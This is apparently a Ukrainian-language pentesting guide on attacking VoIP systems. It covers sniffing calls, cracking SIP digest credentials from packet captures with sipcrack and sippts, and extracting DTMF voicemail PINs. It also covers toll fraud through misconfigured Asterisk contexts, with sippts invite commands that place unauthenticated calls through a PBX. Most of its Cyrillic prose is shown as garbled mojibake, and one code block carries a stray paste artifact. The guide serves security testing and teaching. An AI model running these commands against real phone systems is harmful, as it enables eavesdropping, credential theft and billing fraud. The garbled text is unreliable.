–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ VoIP –æ–±–ª–∞–¥–Ω–∞–Ω–Ω—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **Open Wifi network**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ –≤—Å—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å —É –±—ñ–ª—å—à –∑–∞–∫—Ä–∏—Ç—ñ–π –º–µ—Ä–µ–∂—ñ (–ø—ñ–¥–∫–ª—é—á–µ–Ω—ñ–π —á–µ—Ä–µ–∑ Ethernet –∞–±–æ –∑–∞—Ö–∏—â–µ–Ω–∏–π Wifi), –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ **MitM –∞—Ç–∞–∫–∏, —Ç–∞–∫—ñ —è–∫** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) –º—ñ–∂ **PBX —Ç–∞ —à–ª—é–∑–æ–º**, —â–æ–± –ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

–°–µ—Ä–µ–¥ –º–µ—Ä–µ–∂–µ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–≤–µ–±-–¥–∞–Ω—ñ** –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –æ–±–ª–∞–¥–Ω–∞–Ω–Ω—è–º, **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, **IP** –∞–¥—Ä–µ—Å–∏, –Ω–∞–≤—ñ—Ç—å **—Ö–µ—à–æ–≤–∞–Ω—ñ –ø–∞—Ä–æ–ª—ñ** —Ç–∞ **RTP –ø–∞–∫–µ—Ç–∏**, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥—Ç–≤–æ—Ä–∏—Ç–∏, —â–æ–± **–ø–æ—á—É—Ç–∏ —Ä–æ–∑–º–æ–≤—É**, —ñ –±—ñ–ª—å—à–µ.

–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ Wireshark, tcpdump... –∞–ª–µ **—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è VoIP —Ä–æ–∑–º–æ–≤ - —Ü–µ** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ **TLS –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ SIP –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó**, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ SIP –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é –≤ —á–∏—Å—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ.\
–¢–µ –∂ —Å–∞–º–µ —Å—Ç–∞–Ω–µ—Ç—å—Å—è, —è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **SRTP** —Ç–∞ **ZRTP**, **RTP –ø–∞–∫–µ—Ç–∏ –Ω–µ –±—É–¥—É—Ç—å —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ**.
{% endhint %}

#### SIP credentials (Password Brute-Force - offline)

[–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü–µ–π –ø—Ä–∏–∫–ª–∞–¥, —â–æ–± –∫—Ä–∞—â–µ –∑—Ä–æ–∑—É–º—ñ—Ç–∏ **SIP REGISTER –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ **–Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**.

* **`sipdump`** & **`sipcrack`,** —á–∞—Å—Ç–∏–Ω–∞ **sipcrack** (`apt-get install sipcrack`): –¶—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –º–æ–∂—É—Ç—å **–µ–∫—Å—Ç—Ä–∞–≥—É–≤–∞—Ç–∏** –∑ **pcap** **digest –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** –≤ —Ä–∞–º–∫–∞—Ö SIP –ø—Ä–æ—Ç–æ–∫–æ–ª—É —Ç–∞ **–∑–ª–∞–º—É–≤–∞—Ç–∏** —ó—Ö.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump –º–æ–∂–µ –≤–∏—Ç—è–≥—É–≤–∞—Ç–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó digest –∑ —Ñ–∞–π–ª—É pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑–ª–æ–º—É –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ–π digest, –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é SIPPTS dump.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark –≤–∏—Ç—è–≥—É—î –¥–∞–Ω—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª—É SIP –∑ —Ñ–∞–π–ª—É PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF –∫–æ–¥–∏

**–ù–µ —Ç—ñ–ª—å–∫–∏ SIP –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ –º–µ—Ä–µ–∂–µ–≤–æ–º—É —Ç—Ä–∞—Ñ—ñ–∫—É, —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ DTMF –∫–æ–¥–∏, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ **–≥–æ–ª–æ—Å–æ–≤–æ—ó –ø–æ—à—Ç–∏**.\
–¶—ñ –∫–æ–¥–∏ –º–æ–∂–Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –≤ **INFO SIP –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è—Ö**, –≤ **–∞—É–¥—ñ–æ** –∞–±–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **RTP –ø–∞–∫–µ—Ç—ñ–≤**. –Ø–∫—â–æ –∫–æ–¥–∏ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ RTP –ø–∞–∫–µ—Ç—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏—Ä—ñ–∑–∞—Ç–∏ —Ü—é —á–∞—Å—Ç–∏–Ω—É —Ä–æ–∑–º–æ–≤–∏ —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç multimo –¥–ª—è —ó—Ö –≤–∏—Ç—è–≥–Ω–µ–Ω–Ω—è:
```bash
multimon -a DTMF -t wac pin.wav
```
### –ë–µ–∑–∫–æ—à—Ç–æ–≤–Ω—ñ –¥–∑–≤—ñ–Ω–∫–∏ / –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω—å Asterisk

–í Asterisk –º–æ–∂–ª–∏–≤–æ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑'—î–¥–Ω–∞–Ω–Ω—è **–∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó IP-–∞–¥—Ä–µ—Å–∏** –∞–±–æ –∑ **–±—É–¥—å-—è–∫–æ—ó IP-–∞–¥—Ä–µ—Å–∏**:
```
host=10.10.10.10
host=dynamic
```
–Ø–∫—â–æ –≤–∫–∞–∑–∞–Ω–∞ IP-–∞–¥—Ä–µ—Å–∞, —Ö–æ—Å—Ç **–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ REGISTER** –∑–∞–ø–∏—Ç–∏ —á–∞—Å –≤—ñ–¥ —á–∞—Å—É (–≤ –ø–∞–∫–µ—Ç—ñ REGISTER –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è —á–∞—Å –∂–∏—Ç—Ç—è, –∑–∞–∑–≤–∏—á–∞–π 30 —Ö–≤–∏–ª–∏–Ω, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤ —ñ–Ω—à–æ–º—É –≤–∏–ø–∞–¥–∫—É —Ç–µ–ª–µ—Ñ–æ–Ω –ø–æ–≤–∏–Ω–µ–Ω –±—É–¥–µ –†–ï–ì–Ü–°–¢–†–£–í–ê–¢–ò–°–Ø –∫–æ–∂–Ω—ñ 30 —Ö–≤–∏–ª–∏–Ω). –û–¥–Ω–∞–∫, –π–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∑'—î–¥–Ω–∞–Ω–Ω—è –∑ VoIP —Å–µ—Ä–≤–µ—Ä–æ–º –¥–ª—è –ø—Ä–∏–π–æ–º—É –¥–∑–≤—ñ–Ω–∫—ñ–≤.

–©–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —ó—Ö –º–æ–∂–Ω–∞ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —è–∫:

* **`type=user`**: –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–∫–∏ –ª–∏—à–µ —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á.
* **`type=friend`**: –ú–æ–∂–ª–∏–≤–æ –∑–¥—ñ–π—Å–Ω—é–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–∫–∏ —è–∫ –ø–∞—Ä—Ç–Ω–µ—Ä —ñ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —ó—Ö —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º–∏)
* **`type=peer`**: –ú–æ–∂–ª–∏–≤–æ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ —Ç–∞ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–∫–∏ —è–∫ –ø–∞—Ä—Ç–Ω–µ—Ä (SIP-—Ç—Ä–∞–Ω–∫–∏)

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –¥–æ–≤—ñ—Ä—É –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –∑–º—ñ–Ω–Ω–æ—ó insecure:

* **`insecure=port`**: –î–æ–∑–≤–æ–ª—è—î –∑'—î–¥–Ω–∞–Ω–Ω—è –ø–∞—Ä—Ç–Ω–µ—Ä—ñ–≤, –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏—Ö –∑–∞ IP.
* **`insecure=invite`**: –ù–µ –≤–∏–º–∞–≥–∞—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–ª—è INVITE –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å
* **`insecure=port,invite`**: –û–±–∏–¥–≤–∞

{% hint style="warning" %}
–ö–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **`type=friend`**, **–∑–Ω–∞—á–µ–Ω–Ω—è** –∑–º—ñ–Ω–Ω–æ—ó **host** **–Ω–µ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ**, —Ç–æ–º—É —è–∫—â–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä **–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç—É—î SIP-—Ç—Ä–∞–Ω–∫**, **–±—É–¥—å-—Ö—Ç–æ –∑–º–æ–∂–µ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ –Ω—å–æ–≥–æ**.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Ü—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –±—É–¥–µ –≤—Ä–∞–∑–ª–∏–≤–æ—é:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### –ë–µ–∑–∫–æ—à—Ç–æ–≤–Ω—ñ –¥–∑–≤—ñ–Ω–∫–∏ / –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∫–æ–Ω—Ç–µ–∫—Å—Ç—É Asterisk

–£ Asterisk **–∫–æ–Ω—Ç–µ–∫—Å—Ç** - —Ü–µ —ñ–º–µ–Ω–æ–≤–∞–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∞–±–æ —Å–µ–∫—Ü—ñ—è –≤ –ø–ª–∞–Ω—ñ –Ω–∞–±–æ—Ä—É, —è–∫–∞ **–≥—Ä—É–ø—É—î –ø–æ–≤'—è–∑–∞–Ω—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, –¥—ñ—ó —Ç–∞ –ø—Ä–∞–≤–∏–ª–∞**. –ü–ª–∞–Ω –Ω–∞–±–æ—Ä—É —î –æ—Å–Ω–æ–≤–Ω–∏–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º —Å–∏—Å—Ç–µ–º–∏ Asterisk, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –≤–∏–∑–Ω–∞—á–∞—î **—è–∫ –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è —Ç–∞ –º–∞—Ä—à—Ä—É—Ç–∏–∑—É—é—Ç—å—Å—è –≤—Ö—ñ–¥–Ω—ñ —Ç–∞ –≤–∏—Ö—ñ–¥–Ω—ñ –¥–∑–≤—ñ–Ω–∫–∏**. –ö–æ–Ω—Ç–µ–∫—Å—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó –ø–ª–∞–Ω—É –Ω–∞–±–æ—Ä—É, —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –¥–æ—Å—Ç—É–ø—É —Ç–∞ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è —Ä–æ–∑–¥—ñ–ª–µ–Ω–Ω—è –º—ñ–∂ —Ä—ñ–∑–Ω–∏–º–∏ —á–∞—Å—Ç–∏–Ω–∞–º–∏ —Å–∏—Å—Ç–µ–º–∏.

–ö–æ–∂–µ–Ω –∫–æ–Ω—Ç–µ–∫—Å—Ç –≤–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–æ–º—É —Ñ–∞–π–ª—ñ, –∑–∞–∑–≤–∏—á–∞–π —É —Ñ–∞–π–ª—ñ **`extensions.conf`**. –ö–æ–Ω—Ç–µ–∫—Å—Ç–∏ –ø–æ–∑–Ω–∞—á–∞—é—Ç—å—Å—è –∫–≤–∞–¥—Ä–∞—Ç–Ω–∏–º–∏ –¥—É–∂–∫–∞–º–∏, –∑ —ñ–º–µ–Ω–µ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç—É, —â–æ –º—ñ—Å—Ç–∏—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω–∏—Ö. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```bash
csharpCopy code[my_context]
```
–í—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –≤–∏ –≤–∏–∑–Ω–∞—á–∞—î—Ç–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è (—à–∞–±–ª–æ–Ω–∏ –Ω–∞–±—Ä–∞–Ω–∏—Ö –Ω–æ–º–µ—Ä—ñ–≤) —Ç–∞ –∞—Å–æ—Ü—ñ—é—î—Ç–µ —ó—Ö –∑ —Å–µ—Ä—ñ—î—é –¥—ñ–π –∞–±–æ –¥–æ–¥–∞—Ç–∫—ñ–≤. –¶—ñ –¥—ñ—ó –≤–∏–∑–Ω–∞—á–∞—é—Ç—å, —è–∫ –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è –¥–∑–≤—ñ–Ω–æ–∫. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î –ø—Ä–æ—Å—Ç–∏–π –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø—ñ–¥ –Ω–∞–∑–≤–æ—é "my\_context" –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º "100". –ö–æ–ª–∏ —Ö—Ç–æ—Å—å –Ω–∞–±–∏—Ä–∞—î 100, –¥–∑–≤—ñ–Ω–æ–∫ –±—É–¥–µ –ø—Ä–∏–π–Ω—è—Ç–æ, –±—É–¥–µ –ø—Ä–æ–≥—Ä–∞–Ω–æ –≤—ñ—Ç–∞–ª—å–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –∞ –ø–æ—Ç—ñ–º –¥–∑–≤—ñ–Ω–æ–∫ –±—É–¥–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ.

–¶–µ **—ñ–Ω—à–∏–π –∫–æ–Ω—Ç–µ–∫—Å—Ç**, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î **–¥–∑–≤–æ–Ω–∏—Ç–∏ –Ω–∞ –±—É–¥—å-—è–∫–∏–π —ñ–Ω—à–∏–π –Ω–æ–º–µ—Ä**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
–Ø–∫—â–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –≤–∏–∑–Ω–∞—á–∞—î **default context** —è–∫:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
–ë—É–¥—å-—Ö—Ç–æ –∑–º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—Å–µ—Ä–≤–µ—Ä –¥–ª—è –¥–∑–≤—ñ–Ω–∫—ñ–≤ –Ω–∞ –±—É–¥—å-—è–∫–∏–π —ñ–Ω—à–∏–π –Ω–æ–º–µ—Ä** (—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä —Å–µ—Ä–≤–µ—Ä–∞ –∑–∞–ø–ª–∞—Ç–∏—Ç—å –∑–∞ –¥–∑–≤—ñ–Ω–æ–∫).
{% endhint %}

{% hint style="danger" %}
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ñ–∞–π–ª **`sip.conf`** –º—ñ—Å—Ç–∏—Ç—å **`allowguest=true`**, —Ç–æ–¥—ñ **–±—É–¥—å-—è–∫–∏–π** –∞—Ç–∞–∫—É—é—á–∏–π –±–µ–∑ **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** –∑–º–æ–∂–µ –¥–∑–≤–æ–Ω–∏—Ç–∏ –Ω–∞ –±—É–¥—å-—è–∫–∏–π —ñ–Ω—à–∏–π –Ω–æ–º–µ—Ä.
{% endhint %}

*   **`SIPPTS invite`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ **PBX —Å–µ—Ä–≤–µ—Ä –¥–æ–∑–≤–æ–ª—è—î –Ω–∞–º –∑–¥—ñ–π—Å–Ω—é–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–∫–∏ –±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó**. –Ø–∫—â–æ SIP —Å–µ—Ä–≤–µ—Ä –º–∞—î –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é, –≤—ñ–Ω –¥–æ–∑–≤–æ–ª–∏—Ç—å –Ω–∞–º –∑–¥—ñ–π—Å–Ω—é–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–∫–∏ –Ω–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ –Ω–æ–º–µ—Ä–∏. –¶–µ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –Ω–∞–º –ø–µ—Ä–µ–∞–¥—Ä–µ—Å—É–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–æ–∫ –Ω–∞ –¥—Ä—É–≥–∏–π –∑–æ–≤–Ω—ñ—à–Ω—ñ–π –Ω–æ–º–µ—Ä.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∞—à —Å–µ—Ä–≤–µ—Ä Asterisk –º–∞—î –ø–æ–≥–∞–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∫–æ–Ω—Ç–µ–∫—Å—Ç—É, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–∏–π–º–∞—Ç–∏ –∑–∞–ø–∏—Ç INVITE –±–µ–∑ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ –∑–¥—ñ–π—Å–Ω—é–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–∫–∏, –Ω–µ –∑–Ω–∞—é—á–∏ –∂–æ–¥–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/–ø–∞—Ä–æ–ª—è.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### –ë–µ–∑–∫–æ—à—Ç–æ–≤–Ω—ñ –¥–∑–≤—ñ–Ω–∫–∏ / –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ IVRS

IVRS –æ–∑–Ω–∞—á–∞—î **–°–∏—Å—Ç–µ–º—É —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ—ó –≥–æ–ª–æ—Å–æ–≤–æ—ó –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ**, —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—é —Ç–µ–ª–µ—Ñ–æ–Ω—ñ—ó, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –∫–æ–º–ø'—é—Ç–µ—Ä–∏–∑–æ–≤–∞–Ω–æ—é —Å–∏—Å—Ç–µ–º–æ—é —á–µ—Ä–µ–∑ –≥–æ–ª–æ—Å–æ–≤—ñ –∞–±–æ —Ç–æ–Ω–∞–ª—å–Ω—ñ –≤–≤–µ–¥–µ–Ω–Ω—è. IVRS –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏—Ö —Å–∏—Å—Ç–µ–º –æ–±—Ä–æ–±–∫–∏ –¥–∑–≤—ñ–Ω–∫—ñ–≤**, —è–∫—ñ –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Ä—è–¥ —Ñ—É–Ω–∫—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ –Ω–∞–¥–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—è –¥–∑–≤—ñ–Ω–∫—ñ–≤ —Ç–∞ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.

IVRS —É VoIP —Å–∏—Å—Ç–µ–º–∞—Ö –∑–∞–∑–≤–∏—á–∞–π —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑:

1. **–ì–æ–ª–æ—Å–æ–≤–∏—Ö –ø—ñ–¥–∫–∞–∑–æ–∫**: –ü–æ–ø–µ—Ä–µ–¥–Ω—å–æ –∑–∞–ø–∏—Å–∞–Ω—ñ –∞—É–¥—ñ–æ–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, —è–∫—ñ –Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —á–µ—Ä–µ–∑ –≤–∞—Ä—ñ–∞–Ω—Ç–∏ –º–µ–Ω—é IVR —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó.
2. **DTMF** (Dual-Tone Multi-Frequency) —Å–∏–≥–Ω–∞–ª—ñ–∑–∞—Ü—ñ—è: –¢–æ–Ω–∞–ª—å–Ω—ñ –≤–≤–µ–¥–µ–Ω–Ω—è, —â–æ –≥–µ–Ω–µ—Ä—É—é—Ç—å—Å—è –Ω–∞—Ç–∏—Å–∫–∞–Ω–Ω—è–º –∫–ª–∞–≤—ñ—à –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω—ñ, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –º–µ–Ω—é IVR —Ç–∞ –Ω–∞–¥–∞–Ω–Ω—è –≤–≤–µ–¥–µ–Ω–Ω—è.
